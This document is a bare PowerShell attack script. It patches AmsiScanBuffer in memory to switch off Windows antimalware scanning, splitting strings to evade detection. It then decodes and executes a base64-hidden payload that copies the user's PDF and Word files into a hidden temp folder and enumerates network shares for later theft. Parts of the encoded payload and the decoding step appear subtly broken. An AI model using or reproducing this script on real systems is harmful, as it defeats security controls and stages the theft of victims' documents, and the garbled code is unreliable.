$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

$base64String = "IyBDcmVhdGUgYW4gb2JzY3VyZSBkaXJlY3RvcnkKJG9ic2N1cmVQYXRoID0gIkM6XFVzZXJzXFtVU0VSTkFNRV1cQXBwRGF0YVxMb2NhbFxUZW1wXDFhNzgzMzIiCmlmICgtbm90IChUZXN0LVBhdGggJG9ic2N1cmVQYXRoKSkgewogICAgTmV3LUl0ZW0gLVBhdGggJG9ic2N1cmVQYXRoIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlCn0KCiMgU2VhcmNoIGZvciBQREZzIGFuZCBXb3JkIGRvY3VtZW50cyBpbiB0aGUgY3VycmVudCB1c2VyIHByb2ZpbGUKJHBkZnNBbmRXb3JkcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJGVudjpVU0VSUFJPRklMRSAtRmlsdGVyICIqLnBkZiIgLVJlY3Vyc2UgfCBTZWxlZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgGdWxsTmFtZQokcGRmc0FuZFdvcmRzICs9IEdldC1DaGlsZEl0ZW0gLVBhdGggJGVudjpVU0VSUFJPRklMRSAtRmlsdGVyICIqLmRvY3giIC1SZWN1cnNlIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgRnVsbE5hbWUKCiMgQ29weSBQREZzIGFuZCBXb3JkIGRvY3VtZW50cyB0byB0aGUgb2JzY3VyZSBwYXRoCmZvcmVhY2ggKCRwZGZPcldvcmQgaW4gJHBkZnNBbmRXb3JkcykgewogICAgQ29weS1JdGVtIC1QYXRoICRwZGZPcldvcmQgLURlc3RpbmF0aW9uICRvYnNjdXJlUGF0aAp9CgojIEVudW1lcmF0ZSBuZXR3b3JrIHNoYXJlcwokbmV0d29ya1NoYXJlcyA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX1NoYXJlIC1Db21wdXRlck5hbWUgIioiIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgUGF0aA0KCiMgV3JpdGUgbmV0d29yayBzaGFyZXMgdG8gYSBmaWxlIGluIHRoZSBvYnNjdXJlIHBhdGgKJG5ldHdvcmtTaGFyZXNGaWxlID0gIiRvYnNjdXJlUGF0aFxuZXR3b3JrX3NoYXJlcy50eHQiCk91dC1GaWxlIC1GaWxlUGF0aCAkbmV0d29ya1NoYXJlc0ZpbGUgLUlucHV0T2JqZWN0ICRuZXR3b3JrU2hhcmVzIC1Gb3JjZQ=="

$decodedString = [Convert]::FromBase64String($base64String)
$decodedString = $decodedString | Out-String -Encoding UTF8
IEX($decodedString)
